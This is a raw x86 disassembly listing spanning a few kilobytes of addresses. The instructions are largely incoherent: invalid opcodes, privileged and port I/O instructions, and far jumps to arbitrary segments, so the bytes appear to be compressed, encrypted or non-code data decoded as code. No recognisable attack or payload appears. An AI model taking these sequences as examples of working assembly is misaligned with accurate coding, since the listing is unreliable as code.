  42794d:	aam    0x24
  42794f:	or     esp,DWORD PTR [ebp+0x79e9daad]
  427955:	push   ss
  427956:	ins    DWORD PTR es:[edi],dx
  427957:	pop    ds
  427958:	push   edx
  427959:	test   BYTE PTR [edi-0x39],0xe8
  42795d:	mov    cl,0x50
  42795f:	and    ecx,eax
  427961:	push   ebx
  427962:	int3   
  427963:	and    BYTE PTR [esi+0x67],cl
  427966:	rcl    eax,0xdd
  427969:	push   ebx
  42796a:	dec    eax
  42796b:	test   eax,0x258c87f4
  427970:	cmp    BYTE PTR [ebp+0x72],0x8c
  427974:	and    ecx,ebx
  427976:	fisttp DWORD PTR [edx-0x69]
  427979:	pusha  
  42797a:	and    eax,0xecd0427
  42797f:	pop    eax
  427980:	cs hlt 
  427982:	inc    ebp
  427983:	mov    ebx,DWORD PTR [edx-0x7e0b0735]
  427989:	sub    DWORD PTR [ecx+0x58],edx
  42798c:	iret   
  42798d:	xchg   ecx,eax
  42798e:	add    ch,0x52
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x63ae7b6]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	xor    al,0x88
  427a0e:	add    BYTE PTR [eax],ch
  427a10:	xor    edi,DWORD PTR [ebx-0x4cffeb85]
  427a16:	ds ret 
  427a18:	inc    ecx
  427a19:	jo     0x4279d3
  427a1b:	scas   eax,DWORD PTR es:[edi]
  427a1c:	dec    edi
  427a1d:	lods   eax,DWORD PTR ds:[esi]
  427a1e:	mov    ds:0xeccd046e,al
  427a23:	jnp    0x427a2b
  427a25:	add    eax,0xecd18bd0
  427a2a:	xor    ah,BYTE PTR [ecx-0x66a2db1b]
  427a30:	hlt    
  427a31:	xor    esp,DWORD PTR [ecx-0x3adf16e6]
  427a37:	jne    0x427a03
  427a39:	jecxz  0x4279bf
  427a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a3c:	call   0x221c:0xe8f73030
  427a43:	jb     0x4279ca
  427a45:	mov    WORD PTR [edx],?
  427a47:	jl     0x427a4c
  427a49:	fnstcw WORD PTR [edi]
  427a4b:	call   0xc735661f
  427a50:	pop    ecx
  427a51:	mov    ds:0xfdad414b,al
  427a56:	inc    eax
  427a57:	mov    dh,0xb1
  427a59:	inc    ecx
  427a5a:	dec    esi
  427a5b:	mov    ds:0xc538cc16,eax
  427a60:	sub    ebp,0x40e85542
  427a66:	cmc    
  427a67:	repnz repnz push 0x3a3bd1c6
  427a6e:	xchg   dl,bl
  427a70:	adc    ebx,DWORD PTR [edx+0x4c479643]
  427a76:	xchg   DWORD PTR [eax+0x6d],edx
  427a79:	repz int 0x53
  427a7c:	retf   0xbc71
  427a7f:	jg     0x427a7a
  427a81:	mov    al,0x5b
  427a83:	repnz hlt 
  427a85:	add    ebx,DWORD PTR [edx+0x5b9d6090]
  427a8b:	sub    dh,dh
  427a8d:	ss sbb eax,0xa49d5176
  427a93:	sub    edi,ecx
  427a95:	js     0x427af0
  427a97:	adc    dl,ch
  427a99:	adc    DWORD PTR [ecx+0x15],ebp
  427a9c:	ja     0x427a45
  427a9e:	push   edx
  427a9f:	imul   esp,DWORD PTR [edi-0x7f],0xffffff80
  427aa3:	nop
  427aa4:	add    DWORD PTR ds:0xc3b17b95,0xba0d5d8b
  427aae:	outs   dx,BYTE PTR ds:[esi]
  427aaf:	daa    
  427ab0:	push   ss
  427ab1:	frstor [edi-0x76]
  427ab4:	adc    DWORD PTR [eax-0x50],edx
  427ab7:	icebp  
  427ab8:	sbb    esi,DWORD PTR [ebx-0x18]
  427abb:	lock sbb cl,BYTE PTR [ebx-0x6e211ef2]
  427ac2:	jae    0x427aa0
  427ac4:	inc    ecx
  427ac5:	xchg   BYTE PTR [eax],cl
  427ac7:	xor    DWORD PTR [eax+0x48bb534c],ebp
  427acd:	shr    ch,0x3d
  427ad0:	push   0x903ca97a
  427ad5:	xlat   BYTE PTR ds:[ebx]
  427ad6:	adc    BYTE PTR [ebp+0x48feb66f],ah
  427adc:	xor    DWORD PTR [ecx-0x3d8c6f0e],0x13
  427ae3:	iret   
  427ae4:	xor    bh,BYTE PTR [edi+0x3b8c5220]
  427aea:	outs   dx,DWORD PTR ds:[esi]
  427aeb:	loope  0x427af7
  427aed:	popf   
  427aee:	sar    BYTE PTR [esi-0x6a],0x3d
  427af2:	test   esp,edi
  427af4:	sub    eax,0xb9d9bd85
  427af9:	dec    eax
  427afa:	push   ds
  427afb:	fldenv [ebx-0x10cd71b6]
  427b01:	(bad)  
  427b02:	mov    esi,0x4a5875a2
  427b07:	xor    ch,BYTE PTR [ebp+0x5e882c0c]
  427b0d:	jg     0x427a97
  427b0f:	sbb    eax,0x35
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	idiv   BYTE PTR [ebp+0x27]
  427b82:	add    al,0x95
  427b84:	sti    
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR ds:0x3000001,al
  427b8d:	xchg   edx,eax
  427b8e:	popf   
  427b8f:	fwait
  427b90:	daa    
  427b91:	add    DWORD PTR [ebp+eiz*1+0x4136a68b],ebp
  427b98:	adc    eax,0xd0f44836
  427b9d:	and    DWORD PTR [esi+0x66],eax
  427ba0:	and    BYTE PTR [edi],dl
  427ba2:	jno    0x427bf8
  427ba4:	sbb    DWORD PTR [edx+0x13],0x75bb265a
  427bab:	dec    eax
  427bac:	sub    BYTE PTR [ebp-0x73],dl
  427baf:	(bad)  
  427bb0:	call   0x560f06ab
  427bb5:	js     0x427b38
  427bb7:	and    dh,cl
  427bb9:	jp     0x427c3a
  427bbb:	je     0x427b6e
  427bbd:	js     0x427c16
  427bbf:	mov    esp,0x92b1ca96
  427bc4:	sub    al,0xae
  427bc6:	mov    cl,0xf1
  427bc8:	enter  0x5e40,0x7b
  427bcc:	jmp    0x427b87
  427bce:	inc    esi
  427bcf:	jbe    0x427baf
  427bd1:	retf   0xb045
  427bd4:	xlat   BYTE PTR ds:[ebx]
  427bd5:	cmc    
  427bd6:	push   ebp
  427bd7:	xchg   esp,ebp
  427bd9:	icebp  
  427bda:	adc    eax,0xb1988889
  427bdf:	dec    eax
  427be0:	jb     0x427b6c
  427be2:	sbb    al,0xad
  427be4:	xor    al,0xa4
  427be6:	sar    BYTE PTR [ebx-0x4b5105c4],1
  427bec:	fxtract 
  427bee:	loope  0x427c57
  427bf0:	sbb    DWORD PTR [edx],edx
  427bf2:	cmp    BYTE PTR [ecx],bh
  427bf4:	xchg   esi,eax
  427bf5:	sar    BYTE PTR [esi-0x73],cl
  427bf8:	xor    BYTE PTR [eax-0x7],0x2e
  427bfc:	adc    BYTE PTR [esi+0x5eb5d206],bl
  427c02:	or     al,0x4a
  427c04:	fisub  DWORD PTR [edx-0x47]
  427c07:	call   FWORD PTR [eax]
  427c09:	aam    0x16
  427c0b:	sar    eax,cl
  427c0d:	lock mov edi,0x28f6eb79
  427c13:	push   ebp
  427c14:	ins    BYTE PTR es:[edi],dx
  427c15:	(bad)  
  427c16:	int    0x74
  427c18:	adc    al,0x27
  427c1a:	push   es
  427c1b:	lods   al,BYTE PTR ds:[esi]
  427c1c:	rol    bh,0x6
  427c1f:	outs   dx,BYTE PTR ds:[esi]
  427c20:	fild   WORD PTR [esi]
  427c22:	inc    ebx
  427c23:	shl    BYTE PTR [edi+0x7f],1
  427c26:	lahf   
  427c27:	test   al,0x88
  427c29:	ss and esp,esp
  427c2c:	(bad)  
  427c2e:	cmc    
  427c2f:	sub    eax,DWORD PTR [eax-0x55]
  427c32:	mov    eax,0x801cb33e
  427c37:	lods   eax,DWORD PTR ds:[esi]
  427c38:	inc    ecx
  427c39:	mov    ds:0x62b38351,al
  427c3e:	push   ss
  427c3f:	or     DWORD PTR [esi+0x5a],edx
  427c42:	mov    al,0xca
  427c44:	iret   
  427c45:	pusha  
  427c46:	mov    eax,ds:0x9b82cb47
  427c4b:	push   cs
  427c4c:	add    BYTE PTR [esi-0x129cc5b0],0x57
  427c53:	inc    eax
  427c54:	call   0x482f:0x8f522bdb
  427c5b:	cmp    eax,0x13a1b485
  427c60:	cwde   
  427c61:	xchg   esp,eax
  427c62:	int    0xa0
  427c64:	mov    esi,DWORD PTR ds:0x3f40ad7f
  427c6a:	xchg   DWORD PTR [ebx],edi
  427c6c:	test   DWORD PTR [edx+0xcf9b2f0],ebp
  427c72:	ins    BYTE PTR es:[edi],dx
  427c73:	xlat   BYTE PTR ds:[ebx]
  427c74:	pop    edi
  427c75:	aam    0xe3
  427c77:	sbb    ecx,DWORD PTR [edx-0x27]
  427c7a:	cmp    DWORD PTR ds:0xef01025,0x71c70b27
  427c84:	adc    eax,0xe347cbba
  427c89:	xor    ch,dl
  427c8b:	ins    BYTE PTR es:[edi],dx
  427c8c:	fdiv   st,st(6)
  427c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c8f:	in     eax,0x24
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x60a75d44,ebx
  427d02:	adc    ecx,DWORD PTR [edi+0x1aa00]
  427d08:	add    eax,0xf0000001
  427d0d:	add    bh,BYTE PTR [edi-0x6e1f919a]
  427d13:	push   ebp
  427d14:	sbb    ch,BYTE PTR [ebp+0xe]
  427d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d19:	call   0x1cb7:0xab22a103
  427d20:	jmp    DWORD PTR [edi+0x47db88a4]
  427d26:	jmp    0x48d6b819
  427d2b:	cld    
  427d2c:	jnp    0x427ce4
  427d2e:	addr16 jmp 0x427d38
  427d31:	call   0x711561c5
  427d36:	push   ss
  427d37:	cmp    DWORD PTR [esi],ebp
  427d39:	sub    bh,BYTE PTR [ecx+0x2610e2d7]
  427d3f:	(bad)  
  427d40:	sar    ecx,1
  427d42:	(bad)  
  427d43:	in     al,0xb6
  427d45:	push   ds
  427d46:	push   edi
  427d47:	xchg   edx,eax
  427d48:	mov    ds:0x5dfa3fdb,al
  427d4d:	ret    
  427d4e:	imul   eax,DWORD PTR [ecx],0xffffff91
  427d51:	jmp    0x7e580450
  427d56:	sahf   
  427d57:	scas   eax,DWORD PTR es:[edi]
  427d58:	add    eax,0xfa2e51ee
  427d5d:	inc    eax
  427d5e:	mov    DWORD PTR [edi],ebp
  427d60:	sub    DWORD PTR [ecx-0x70159511],esp
  427d66:	adc    al,0x14
  427d68:	aad    0xdd
  427d6a:	ret    
  427d6b:	jecxz  0x427d85
  427d6d:	pop    ebp
  427d6e:	in     eax,0x3e
  427d70:	scas   eax,DWORD PTR es:[edi]
  427d71:	fsub   QWORD PTR [eax+0x8]
  427d74:	inc    ebp
  427d75:	(bad)  
  427d77:	ret    0xc284
  427d7a:	rol    DWORD PTR [ebx+0x41b4df1e],0x43
  427d81:	pop    edi
  427d82:	sbb    al,0x84
  427d84:	xlat   BYTE PTR ds:[ebx]
  427d85:	arpl   WORD PTR ds:0x4a02e6e6,dx
  427d8b:	gs out 0xf1,eax
  427d8e:	or     edi,DWORD PTR [ecx+edi*8]
  427d91:	fisttp QWORD PTR [ebp+0x34a27307]
  427d97:	sbb    bl,BYTE PTR [esp+eiz*8]
  427d9a:	jae    0x427dfe
  427d9c:	popa   
  427d9d:	xor    edi,edx
  427d9f:	cmp    esp,edx
  427da1:	pop    esp
  427da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427da3:	inc    ebx
  427da4:	inc    edi
  427da6:	sub    BYTE PTR [ecx],dl
  427da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427da9:	lods   al,BYTE PTR ds:[esi]
  427daa:	cs mov dh,0x3a
  427dad:	test   dl,al
  427daf:	mov    dh,0xd
  427db1:	ja     0x427dd7
  427db3:	dec    ecx
  427db4:	cmp    dl,BYTE PTR [ebx-0x8]
  427db7:	stos   DWORD PTR es:[edi],eax
  427db8:	into   
  427db9:	sub    DWORD PTR [ecx+0x9226bc9],edi
  427dbf:	dec    ebx
  427dc0:	mov    edx,0x1ac6675a
  427dc5:	test   al,0xb1
  427dc7:	scas   al,BYTE PTR es:[edi]
  427dc8:	lea    edi,[ecx]
  427dca:	retf   0x354d
  427dcd:	fcomp  DWORD PTR [eax]
  427dcf:	mov    dl,0x1e
  427dd1:	mov    ds:0x3a6f5519,al
  427dd6:	push   esp
  427dd7:	xor    ah,0xbf
  427dda:	fdivr  DWORD PTR [ebx]
  427ddc:	inc    edx
  427ddd:	sbb    dl,BYTE PTR [ecx-0x3a]
  427de0:	jp     0x427e25
  427de2:	adc    al,ah
  427de4:	jp     0x427dea
  427de6:	mov    eax,0x4594bbfd
  427deb:	popa   
  427dec:	adc    al,0x59
  427dee:	outs   dx,BYTE PTR ds:[esi]
  427def:	mov    ds:0xb86ac6b0,al
  427df4:	inc    DWORD PTR [eax+0x36]
  427df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427df8:	mov    al,bl
  427dfa:	mov    ah,BYTE PTR [ebp+0x2530f31]
  427e00:	imul   ecx,DWORD PTR [ecx],0xffffff93
  427e03:	into   
  427e04:	imul   BYTE PTR [esi]
  427e06:	pop    es
  427e07:	cmp    al,0x8d
  427e09:	add    BYTE PTR [ecx],ch
  427e0b:	(bad)  
  427e0c:	fcomp  DWORD PTR [ecx]
  427e0e:	shl    ecx,0x36
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	cli    
  427e81:	fld    QWORD PTR [ecx+0x1ab0502]
  427e87:	add    BYTE PTR ds:0x80000001,al
  427e8d:	test   DWORD PTR [ebx+0x2f],ebp
  427e90:	or     ecx,ecx
  427e92:	push   0x1a142f0
  427e97:	pop    ebp
  427e98:	loope  0x427e82
  427e9a:	mov    ebp,0x7367c4a6
  427e9f:	jmp    0x1afd:0xb95cb32c
  427ea6:	pop    eax
  427ea7:	mov    gs,ecx
  427ea9:	arpl   WORD PTR [esi-0x2c2c66d4],bx
  427eaf:	sub    ecx,eax
  427eb1:	inc    ecx
  427eb2:	popf   
  427eb3:	cdq    
  427eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427eb5:	mov    ebx,0x6e2e3e3d
  427eba:	adc    al,0xea
  427ebc:	outs   dx,DWORD PTR ds:[esi]
  427ebd:	out    dx,al
  427ebe:	lock adc edx,eax
  427ec1:	repnz mov bl,bl
  427ec4:	sbb    dh,BYTE PTR [ebp+0x53a8b71]
  427eca:	test   DWORD PTR [ecx+0x3b],ebx
  427ecd:	inc    edx
  427ece:	std    
  427ecf:	mov    eax,DWORD PTR [edi-0x1f]
  427ed2:	nop
  427ed3:	and    al,0x73
  427ed5:	pop    eax
  427ed6:	or     esi,edi
  427ed8:	inc    esi
  427ed9:	mov    DWORD PTR [ebx+0x471afd8c],ecx
  427edf:	pop    edx
  427ee0:	push   edi
  427ee1:	das    
  427ee2:	add    dl,BYTE PTR [esi+0x10]
  427ee5:	pop    ecx
  427ee6:	stos   DWORD PTR es:[edi],eax
  427ee7:	fisubr DWORD PTR [ebx*2-0x39bf4c90]
  427eee:	cmp    eax,0x8da452cf
  427ef3:	ret    
  427ef4:	mov    ebx,0x85c0bc68
  427ef9:	xor    eax,0x933d5a48
  427efe:	sub    BYTE PTR [ecx-0x3b1aa9fb],bh
  427f04:	(bad)
  427f08:	adc    BYTE PTR [edx],bh
  427f0a:	out    0x39,eax
  427f0c:	hlt    
  427f0d:	pop    ds
  427f0e:	hlt    
  427f0f:	and    al,0xab
  427f11:	fsubr  st(4),st
  427f13:	pop    es
  427f14:	outs   dx,BYTE PTR ds:[esi]
  427f15:	enter  0xd766,0x1f
  427f19:	pusha  
  427f1a:	into   
  427f1b:	xor    esp,DWORD PTR [ebp+0x4ae8eef]
  427f21:	xor    esp,DWORD PTR [ecx+0x29e5427]
  427f27:	retf   0xf9a3
  427f2a:	pop    ebx
  427f2b:	jmp    0xb0f45b64
  427f30:	sbb    DWORD PTR [ecx+0x3e],0xeafb1cac
  427f37:	inc    ebx
  427f38:	push   esp
  427f39:	xchg   ebx,eax
  427f3a:	pushf  
  427f3b:	daa    
  427f3c:	fs pop es
  427f3e:	fist   WORD PTR [edi+0x8676785]
  427f44:	adc    ah,BYTE PTR [esi]
  427f46:	or     al,0xee
  427f48:	mov    eax,0x97439d59
  427f4d:	jmp    0xc17d2fc
  427f52:	retf   0xff52
  427f55:	ins    DWORD PTR es:[edi],dx
  427f56:	inc    esi
  427f57:	or     bh,BYTE PTR [eax]
  427f59:	push   esp
  427f5a:	sti    
  427f5b:	xchg   ebp,eax
  427f5c:	es jne 0x427fc4
  427f5f:	out    dx,eax
  427f60:	repz inc ebx
  427f62:	leave  
  427f63:	sti    
  427f64:	(bad)  
  427f65:	ins    BYTE PTR es:[edi],dx
  427f66:	push   ebx
  427f67:	hlt    
  427f68:	cwde   
  427f69:	mov    dl,0xc0
  427f6b:	cdq    
  427f6c:	pop    ebp
  427f6d:	mov    eax,0x8a474810
  427f72:	mov    dh,0xd8
  427f74:	pop    es
  427f75:	cmp    dl,BYTE PTR ds:0xbe5efa50
  427f7b:	pushf  
  427f7c:	repnz cmc 
  427f7e:	cwde   
  427f7f:	push   ebp
  427f80:	inc    esi
  427f81:	pop    ebx
  427f82:	call   0x77441db6
  427f87:	sti    
  427f88:	xlat   BYTE PTR ds:[ebx]
  427f89:	jno    0x427f8e
  427f8b:	repz stc 
  427f8d:	pop    esp
  427f8e:	sahf   
  427f8f:	inc    ecx
  427f90:	ins    BYTE PTR es:[edi],dx
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	and    al,0x23
  428002:	and    al,0x8
  428004:	or     ch,BYTE PTR [ecx+eax*1+0x10500]
  42800b:	add    al,ah
  42800d:	jecxz  0x428075
  42800f:	(bad)  
  428010:	in     al,0xcc
  428012:	adc    eax,0x739a380f
  428017:	jns    0x427fee
  428019:	fdivr  QWORD PTR [edi-0x6e]
  42801c:	(bad)  
  42801d:	retf   0xd2d4
  428020:	fsubr  QWORD PTR [ecx+edi*8]
  428023:	jge    0x427fb7
  428025:	sub    DWORD PTR [ebp+0x1c4e735b],ebx
  42802b:	xlat   BYTE PTR ds:[ebx]
  42802c:	xor    al,0x43
  42802e:	call   0x55d2:0x4b728dd8
  428035:	rcl    DWORD PTR [edi-0xe2270b2],0xa0
  42803c:	jmp    FWORD PTR [ebx]
  42803e:	xchg   edx,eax
  42803f:	mov    ebp,0xdab0ece2
  428044:	into   
  428045:	test   DWORD PTR [ecx+0x2a],esp
  428048:	jns    0x428052
  42804a:	fwait
  42804b:	dec    ebx
  42804c:	(bad)  
  42804d:	jecxz  0x428026
  42804f:	pop    edx
  428050:	bound  ebx,QWORD PTR [ecx-0x3f]
  428053:	pop    eax
  428054:	aad    0x9e
  428056:	and    al,0x10
  428058:	pop    ss
  428059:	pop    edi
  42805a:	out    dx,eax
  42805b:	pop    edi
  42805c:	sbb    bl,0x7a
  42805f:	mov    DWORD PTR [ebp-0x35],edx
  428062:	call   0xa201:0x383422ce
  428069:	int    0x56
  42806b:	pop    eax
  42806c:	ss mov ah,0x6f
  42806f:	(bad)  
  428070:	cmp    bl,al
  428072:	dec    esi
  428073:	iret   
  428074:	pop    esi
  428075:	ja     0x428039
  428077:	xchg   BYTE PTR [edx+ecx*8-0x114e9bb4],dl
  42807e:	ss xor al,0x63
  428081:	(bad)  
  428082:	imul   edi,edi,0x35
  428085:	jo     0x4280df
  428087:	fnstenv [eax+ecx*4]
  42808a:	int    0x97
  42808c:	inc    ebx
  42808d:	sub    al,BYTE PTR [ebx+0x75650fd0]
  428093:	dec    ebx
  428094:	call   0xe89eade5
  428099:	mov    DWORD PTR [eax+0x2c],edx
  42809c:	pop    esi
  42809d:	pop    ecx
  42809e:	repz add DWORD PTR [eax+0x3c],0x406bfe61
  4280a6:	and    ebx,esp
  4280a8:	push   eax
  4280a9:	repnz sbb DWORD PTR [eax+ebp*1+0x3af00177],edx
  4280b1:	shl    BYTE PTR [esp+ebp*2+0x46f3e832],cl
  4280b8:	add    eax,0xa1f2d591
  4280bd:	dec    ebp
  4280be:	mov    dh,0x30
  4280c0:	leave  
  4280c1:	pop    ecx
  4280c2:	xchg   esp,eax
  4280c3:	and    BYTE PTR [ebx],0x65
  4280c6:	enter  0x96b8,0xea
  4280ca:	cmc    
  4280cb:	out    dx,al
  4280cc:	adc    eax,0xd6af0f70
  4280d1:	mov    cl,0xad
  4280d3:	pop    ecx
  4280d4:	loopne 0x4280fa
  4280d6:	je     0x42813f
  4280d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280d9:	in     eax,0x4a
  4280db:	push   esi
  4280dc:	jge    0x42812a
  4280de:	jne    0x42807f
  4280e0:	jno    0x42809a
  4280e2:	fnstenv [esi+0x1c21a094]
  4280e8:	and    esi,DWORD PTR [eax-0x5c028763]
  4280ee:	cmp    ebx,DWORD PTR [ecx+0x1bdd8017]
  4280f4:	mov    al,ds:0x443f84fe
  4280f9:	inc    edi
  4280fa:	or     al,0x72
  4280fc:	pop    eax
  4280fd:	lock mov BYTE PTR [ebx-0x6a],dh
  428101:	pushf  
  428102:	dec    esi
  428103:	sbb    al,0xf7
  428105:	xor    DWORD PTR [ebx-0x2d],0x7a
  428109:	jns    0x428112
  42810b:	fmul   st(0),st
  42810d:	out    0x50,al
  42810f:	add    esi,esp
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	mov    BYTE PTR [ebx-0x6a],dl
  428183:	loop   0x428194
  428185:	lods   eax,DWORD PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0xfe000001
  42818d:	shl    BYTE PTR [edi+edi*2-0x41a13ad5],1
  428194:	icebp  
  428195:	test   BYTE PTR [edx+0x40b86056],ah
  42819b:	int3   
  42819c:	sbb    eax,0xc0fcb1e9
  4281a1:	inc    ecx
  4281a2:	push   ebp
  4281a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281a4:	pushf  
  4281a5:	test   ah,al
  4281a7:	in     eax,dx
  4281a8:	fwait
  4281a9:	loopne 0x428132
  4281ab:	ins    BYTE PTR es:[edi],dx
  4281ac:	ja     0x4281b1
  4281ae:	inc    ebp
  4281af:	jae    0x4281ec
  4281b1:	pusha  
  4281b2:	mov    WORD PTR [ecx+edi*8-0x7a],ss
  4281b6:	in     eax,dx
  4281b7:	(bad)  
  4281b8:	div    DWORD PTR [ecx]
  4281ba:	xor    al,0x46
  4281bc:	loope  0x428192
  4281be:	outs   dx,BYTE PTR ds:[esi]
  4281bf:	sub    al,0xbf
  4281c1:	pop    ebp
  4281c2:	lods   al,BYTE PTR ds:[esi]
  4281c3:	pop    esi
  4281c4:	mov    ch,0x41
  4281c6:	dec    edi
  4281c7:	or     ebx,DWORD PTR [esp+0x21c6d392]
  4281ce:	sbb    edx,DWORD PTR ds:0x97eafcf6
  4281d4:	pcmpeqw mm2,QWORD PTR [ecx+0x7744614c]
  4281db:	out    dx,al
  4281dc:	mov    DWORD PTR [edi+0x6f],esp
  4281df:	jno    0x42821d
  4281e1:	lock push es
  4281e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281e4:	xchg   ebx,eax
  4281e5:	lods   al,BYTE PTR ds:[esi]
  4281e6:	add    BYTE PTR [edx],dl
  4281e8:	repz jae 0x4281b4
  4281eb:	or     al,0x82
  4281ed:	or     edx,DWORD PTR [edi]
  4281ef:	push   es
  4281f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f1:	call   0xa6dbbe8
  4281f6:	or     dh,BYTE PTR [eax+0x78]
  4281f9:	dec    edx
  4281fa:	jae    0x428243
  4281fc:	(bad)  
  4281fd:	jae    0x42820c
  4281ff:	out    0x4b,eax
  428201:	repz or dh,BYTE PTR [edx]
  428204:	mov    eax,0x17902494
  428209:	dec    esi
  42820a:	mov    eax,0x657108b3
  42820f:	ret    0x629c
  428212:	and    eax,0xaea41936
  428217:	popf   
  428218:	into   
  428219:	xchg   ecx,eax
  42821a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42821b:	dec    ebx
  42821c:	xlat   BYTE PTR ds:[ebx]
  42821d:	inc    edi
  42821e:	aad    0x38
  428220:	shr    BYTE PTR [esi+0x7c9ebddf],cl
  428226:	jb     0x4281e1
  428228:	inc    esi
  428229:	xor    DWORD PTR [edi+0x1a2eac9d],edx
  42822f:	out    0x2d,eax
  428231:	or     DWORD PTR [ebp+0x5ca1ffa2],ebx
  428237:	cmc    
  428238:	dec    edx
  428239:	leave  
  42823a:	sub    al,al
  42823c:	or     BYTE PTR [ebx],bh
  42823e:	sub    dh,BYTE PTR [edx-0x10]
  428241:	push   ebx
  428242:	xchg   edi,eax
  428243:	out    dx,eax
  428244:	out    0x12,al
  428246:	sub    dh,BYTE PTR [edx]
  428248:	mov    dl,ch
  42824a:	jno    0x4281cf
  42824c:	mov    al,0xde
  42824e:	pop    eax
  42824f:	mov    WORD PTR [eax+0x7cfcc91b],ss
  428255:	int    0x8
  428257:	inc    esi
  428258:	xchg   esp,eax
  428259:	inc    ebx
  42825a:	lock rcl DWORD PTR [esi-0x24],cl
  42825e:	jecxz  0x428258
  428260:	neg    BYTE PTR [ebx-0x7]
  428263:	push   edx
  428264:	lods   eax,DWORD PTR ds:[esi]
  428265:	jns    0x428218
  428267:	push   esi
  428268:	mov    dh,0xb9
  42826a:	jge    0x4282a1
  42826c:	imul   ebx,DWORD PTR [esi-0x7ccdbba5],0xffffffd5
  428273:	mov    edx,0x923da9de
  428278:	pop    ecx
  428279:	std    
  42827a:	in     eax,dx
  42827b:	pop    ebp
  42827c:	and    BYTE PTR [esi],0x6f
  42827f:	fisubr WORD PTR [esi]
  428281:	ficom  DWORD PTR [ebx]
  428283:	dec    edx
  428284:	inc    esp
  428285:	test   ch,al
  428287:	shr    esi,0x6c
  42828a:	add    al,0xa7
  42828c:	or     ch,BYTE PTR [esi+0x34]
  42828f:	pop    es
  428290:	pop    ss
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	pop    ebp
  428301:	mov    al,ds:0xae143aee
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x6d000001
  42830d:	jmp    DWORD PTR [eax]
  42830f:	jge    0x4282f6
  428311:	pop    ebx
  428312:	jmp    0x428356
  428314:	stc    
  428315:	jl     0x4282ff
  428317:	and    al,0xdf
  428319:	sti    
  42831a:	repz in al,0x5b
  42831d:	jp     0x4282e2
  42831f:	pop    ss
  428320:	arpl   WORD PTR [ebp+0x2f9d4626],di
  428326:	adc    DWORD PTR [ebx-0x104efbbb],edi
  42832c:	int3   
  42832d:	sub    BYTE PTR [eax-0x22d6a6cf],bl
  428333:	sub    DWORD PTR [ebx-0x21],edx
  428336:	test   dh,dl
  428338:	push   0xffffffbc
  42833a:	mov    edx,0xa374dc4d
  42833f:	pop    ds
  428340:	fdivr  QWORD PTR [edx+0x4fc5f99c]
  428346:	jle    0x4283b3
  428348:	push   eax
  428349:	mov    ah,0xe5
  42834b:	jg     0x4283a1
  42834d:	jno    0x428323
  42834f:	repz loop 0x428388
  428352:	das    
  428353:	add    DWORD PTR [ebx-0x66caa895],esi
  428359:	inc    edi
  42835a:	aas    
  42835b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42835c:	dec    ecx
  42835d:	add    al,0x1f
  42835f:	test   al,0x98
  428361:	pusha  
  428362:	ins    BYTE PTR es:[edi],dx
  428363:	or     eax,esp
  428365:	push   cs
  428366:	cdq    
  428367:	xor    ebx,DWORD PTR [ebp+esi*4+0x1fae9db0]
  42836e:	mov    ch,0xe1
  428370:	mov    esp,0x1f910d56
  428375:	inc    ebp
  428376:	jne    0x4283e7
  428378:	sub    DWORD PTR ds:0xc189e9b2,edx
  42837e:	push   edx
  42837f:	or     BYTE PTR [ebp+ecx*4+0x2a],cl
  428383:	pop    edi
  428384:	dec    ebx
  428385:	retf   0x1890
  428388:	ins    BYTE PTR es:[edi],dx
  428389:	gs jbe 0x42838e
  42838c:	mov    WORD PTR [ecx+0x5e],cs
  42838f:	nop
  428390:	sub    ebp,edx
  428392:	jne    0x428409
  428394:	mov    BYTE PTR [eax+0x7a],0x13
  428398:	xor    BYTE PTR [eax-0x66cdd5a6],bl
  42839e:	shr    bl,1
  4283a0:	adc    al,0x8c
  4283a2:	hlt    
  4283a3:	pop    esp
  4283a4:	dec    edx
  4283a5:	add    eax,0xf81ea9a9
  4283aa:	je     0x4283b9
  4283ac:	fwait
  4283ad:	mov    esp,0x1310fc11
  4283b2:	das    
